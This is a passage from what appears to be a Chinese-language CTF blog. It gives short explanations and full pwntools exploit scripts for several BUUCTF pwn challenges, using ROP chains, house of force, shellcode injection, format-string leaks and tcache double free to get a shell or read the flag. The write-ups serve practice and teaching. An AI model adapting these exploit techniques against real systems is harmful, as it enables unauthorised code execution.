class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(base + <span class="number">0x4f322</span>) * <span class="number">4</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu194-ciscn_2019_s_8"><a class="markdownIt-Anchor" href="#buu194-ciscn_2019_s_8"></a> buu194-ciscn_2019_s_8</h1>
<p>这道题就是考ROP，一个静态编译，能够找到很多的gadget。下面使用的是<code>system('/bin/sh')</code>的方式。首先需要将字符串/bin/sh写到一个地方，通过对程序的逆向分析可以找到read函数的地址。输入完成之后就是调用syscall。尤其需要注意get shell的参数。第一个参数（rdi）保存字符串<code>/bin/sh</code>的地址，第二个参数（rsi）保存字符串<code>sh</code>的<strong>二重指针地址</strong>，注意是二重指针。因为<code>/bin/sh</code>里面已经有<code>sh</code>，所以直接可以偏移5个字符，不过我们传入rsi的值应该是保存有这个偏移5个字节的地址的地址，那么之前在写的时候就需要顺便写一个地址值。然后rdx赋值0即可。<br />
另外本题有一个函数会对输入进行处理，经过简单分析即可得知是为每个字节异或0x66，写gadget的时候异或一下就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25478</span>)</span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x4006e6</span></span><br><span class="line">poprsi = <span class="number">0x4040fe</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">poprsp = <span class="number">0x400d22</span></span><br><span class="line">poprax = <span class="number">0x449b9c</span></span><br><span class="line">poprbx = <span class="number">0x4005ee</span></span><br><span class="line">poprcx = <span class="number">0x400be2</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">pushrsp = <span class="number">0x482997</span>	<span class="comment"># call rdx</span></span><br><span class="line">poprsirbp = <span class="number">0x40f99e</span></span><br><span class="line">movrdirbp = <span class="number">0x422c45</span>	<span class="comment"># call rax</span></span><br><span class="line">syscall = <span class="number">0x44C177</span>	<span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">read = <span class="number">0x449be0</span></span><br><span class="line">bss = <span class="number">0x6BC300</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span> + <span class="number">8</span> - <span class="number">8</span> * <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(pushrsp ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(bss - 0x300 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0x1000 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(7 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0xA ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(read ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0x2 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0xbss ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0) * 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64((bss + <span class="number">8</span>) ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(syscall ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Please enter your Password: &#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(bss + <span class="number">5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu104-wustctf2020_name_your_dog"><a class="markdownIt-Anchor" href="#buu104-wustctf2020_name_your_dog"></a> buu104-wustctf2020_name_your_dog</h1>
<p>整数溢出，往scanf.got里面写后门函数地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wustctf2020_name_your_dog&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;wustctf2020_name_your_dog&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27877</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Name for which?\n&gt;&#x27;</span>, <span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Give your name plz: &#x27;</span>, packing.p32(elf.symbols[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu105-gyctf_2020_force"><a class="markdownIt-Anchor" href="#buu105-gyctf_2020_force"></a> buu105-gyctf_2020_force</h1>
<p>从题目就可以看出考的是house of force，由于分配的chunk大小无限制，可分配很大的chunk，这类chunk会通过mmap分配，且会紧靠libc下面分配，由此可获得libc地址。然后在堆分配一个小chunk获取top chunk大小，同时0x50溢出修改top chunk的size，分配超大chunk让top chunk到<code>__malloc_hook</code>，这样就能够在<code>__malloc_hook</code>分配，考虑到内存对齐问题，还需要跳到<code>__realloc_hook</code>进行处理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/git_clones/glibc_run/glibc_versions/2.23/x64/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.23&#x27;, &#x27;./gyctf_2020_force&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29751</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># pid = get_process_pid(&#x27;./gyctf_2020_force&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x200000</span>).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin addr 0x&#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">libc_addr = heap_addr + <span class="number">0x200FF0</span></span><br><span class="line">__malloc_hook = libc_addr + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_addr + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__malloc_hook: &quot;</span> + <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x18</span>).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin addr 0x&#x27;</span>)</span><br><span class="line">heap_addr1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr1))</span><br><span class="line">top_chunk_size_addr = heap_addr1 + <span class="number">0x10</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, cyclic(<span class="number">0x18</span>) + packing.p64(__malloc_hook - top_chunk_size_addr + <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(__malloc_hook - top_chunk_size_addr - <span class="number">0x30</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, packing.p64(<span class="number">0</span>) + packing.p64(one_gadgets[<span class="number">1</span>] + libc_addr) + packing.p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(pid)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu106-wdb_2018_3rd_soeasy"><a class="markdownIt-Anchor" href="#buu106-wdb_2018_3rd_soeasy"></a> buu106-wdb_2018_3rd_soEasy</h1>
<p>简单栈溢出+shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_3rd_soEasy&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;./wdb_2018_3rd_soEasy&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27654</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hei,give you a gift-&gt;0x&#x27;</span>)</span><br><span class="line">shell_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span> + <span class="number">4</span>)</span><br><span class="line">payload += packing.p32(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu107-judgement_mna_2016"><a class="markdownIt-Anchor" href="#buu107-judgement_mna_2016"></a> buu107-judgement_mna_2016</h1>
<p>字符串比较，格式化字符串漏洞直接能给flag读出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./judgement_mna_2016&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;./judgement_mna_2016&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28122</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%45$s  \x00&#x27;</span> + packing.p32(elf.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Flag judgment system\nInput flag &gt;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu108-ciscn_2019_en_3"><a class="markdownIt-Anchor" href="#buu108-ciscn_2019_en_3"></a> buu108-ciscn_2019_en_3</h1>
<p>格式化字符串泄露libc基地址，因为这个是带了检查的因此不能直接使用<code>%7$x</code>这样的参数，但是可以通过<code>%c</code>一个个往后泄露，这个是检查不了的，然后借助fastbin dup，use after free之后chunk进入tcache，可以避免fastbin中对于chunk大小的检查，因此可以分配到任意地址去，尝试了<code>__malloc_hook</code>的三个one_gadget发现都不行，因此使用<code>__free_hook</code>来完成利用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_en_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.27&#x27;, &#x27;./ciscn_2019_en_3&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26164</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Please input the size of story: \n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;please inpute the story: \n&#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Please input the index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?\n&#x27;</span>, <span class="string">b&#x27;%c%c%c%c%c%c%llx&#x27;</span> + packing.p64(<span class="number">0</span>) * <span class="number">2</span>)	<span class="comment"># 0x680</span></span><br><span class="line">io.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>) - <span class="number">0x3ec680</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line">__malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line">__free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">realloc = libc_base + <span class="number">0x98c30</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b&#x27;ID.\n&#x27;, b&#x27;flag&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">one_gadgets = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">add(<span class="number">0x60</span>, packing.p64(__free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, packing.p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(get_process_pid(&#x27;./ciscn_2019_en_3&#x27;))</span></span><br><span class="line"><span class="comment"># time.sleep(1)</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu109-picoctf_2018_buffer-overflow-0"><a class="markdownIt-Anchor" href="#buu109-picoctf_2018_buffer-overflow-0"></a> buu109-picoctf_2018_buffer overflow 0</h1>
<p>略</p>
<h1 id="buu110-ciscn_2019_final_2"><a class="markdownIt-Anchor" href="#buu110-ciscn_2019_final_2"></a> buu110-ciscn_2019_final_2</h1>
<p>这是一道比较有意思的题。题目首先初始化过程中打开了flag文件，并将文件描述符设置为666。在本题中，经过理论分析发现，我们实际上可以直接获得shell，但出题人的本意显然不是这样。</p>
<p>由于glibc 2.27对于tcache double free的检查过于宽松，导致我们几乎可以无限制地在tcache上进行double free甚至多重free。因此在本题中，我们可以通过double free的方法释放出一个较大的可以被放入unsorted bin中的chunk，随后通过堆块重叠可将tcache指针修改到<code>_IO_2_1_stdin_</code>的<code>fd</code>字段，将标准输入的文件描述符从0改成666，这样标准输入就相当于重定向到了flag文件中，不过需要注意的是，在主界面菜单选择中，题目使用的是<code>read</code>函数，还是直接从文件描述符0的真标准输入读取，但在<code>bye_bye</code>中的scanf就会使用<code>_IO_2_1_stdin_</code>中的文件描述符，因此最后退出会直接输出flag的内容。</p>
<p>利用流程如下图所示。</p>
<p><img src="1.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 